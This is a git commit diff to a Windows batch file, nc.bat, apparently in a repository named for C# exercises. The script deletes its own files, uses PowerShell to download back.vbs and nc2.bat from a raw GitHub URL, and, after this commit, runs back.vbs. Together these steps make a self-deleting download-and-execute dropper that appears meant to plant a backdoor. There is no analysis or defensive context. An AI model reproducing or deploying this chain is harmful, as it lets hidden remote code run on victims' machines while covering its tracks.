afb961dcd5ecc84640028033a65ac0fe96638bda
Rafael Ferreira Pedrosa <rafaelfepedrosa@gmail.com>
2022-05-27 17:00:24 -0300

    Update nc.bat

--- nc.bat
+++ nc.bat
@@ -5,8 +5,4 @@ del nc.bat
 del nc2.bat
 powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rfaelfp/c-sharpI/main/back.vbs','back.vbs')
 powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rfaelfp/c-sharpI/main/nc2.bat','nc2.bat')
-del back.vbs
-del nc.bat
-del nc2.bat
-cls
-exit
+back.vbs
